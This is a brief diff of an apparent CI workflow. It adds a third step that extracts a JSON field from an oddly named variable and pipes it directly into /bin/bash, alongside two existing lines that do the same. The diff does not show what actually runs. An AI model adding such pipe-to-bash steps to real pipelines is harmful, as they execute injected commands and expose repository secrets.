@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$fm6844" | jq -r .cdn649 | /bin/bash
           printf '%s' "$cvn65626" | jq -r .fbh90 | /bin/bash
+          echo $put08523 | jq -r .ss0973 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
